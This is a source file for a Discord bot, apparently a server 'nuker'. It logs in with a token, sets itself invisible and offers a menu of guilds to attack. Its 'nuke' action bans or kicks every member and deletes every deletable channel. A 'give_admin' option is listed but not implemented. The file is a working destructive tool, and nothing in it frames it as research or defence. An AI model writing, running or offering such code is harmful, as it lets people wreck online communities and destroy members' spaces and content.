import { Client, Guild } from "discord.js"
import { config } from "dotenv"
import inquirer from "inquirer"
config({
    quiet: true
})

const client = new Client({
    intents: [
        "GuildBans",
        "Guilds",
        "GuildMembers",
        "GuildMessages",
        "GuildMessageReactions",
        "MessageContent"
    ]
})

client.on("clientReady", async()=>{
    client.user?.setStatus("invisible");
})

await client.login(process.env.TOKEN);

const guilds = await client.guilds.fetch();

while(true) {
    const answers = await inquirer.prompt([
        {
            type: "search",
            name: "select_guild",
            message: "Select Guild",
            source: async (term) => {
                const query = term?.toLowerCase() ?? "";

                return guilds.filter((g) =>
                    g.name.toLowerCase().includes(query)
                ).map((g) => ({
                    name: g.name,
                    value: g.id,
                }));
            }
        }
    ]);

    const guild = await guilds.find(g => g.id == answers.select_guild)?.fetch();

    if(guild) {
        const choice = await inquirer.prompt([
            {
                type: "select",
                name: "action",
                message: "Action",
                choices: [
                    "nuke",
                    "give_admin",
                    "leave",
                    "back"
                ]
            }
        ]);

        
        if (choice.action === "nuke") {
            const members = await guild.members.fetch();

            const targets = members.filter(
                member => member.id !== client.user?.id
            );

            for(const target of targets) {
                if(target[1].bannable) {
                    await target[1].ban();
                    console.log(`banned ${target[1].displayName}`)
                } else if(target[1].kickable) {
                    await target[1].kick();
                    console.log(`kicked ${target[1].displayName}`)
                } else {
                    console.log(`failed to ban or kick ${target[1].displayName}`)
                }
            }

            console.log("banned users");

            const channels = await guild.channels.fetch();

            for(const channel of channels) {
                if(channel[1]?.deletable) {
                    channel[1]?.delete();
                    console.log(`kicked ${channel[1].name}`)
                } else {
                    
                }
            }

            console.log("deleted channels");
        }
    } else {
        console.error("invalid guild");
    }
}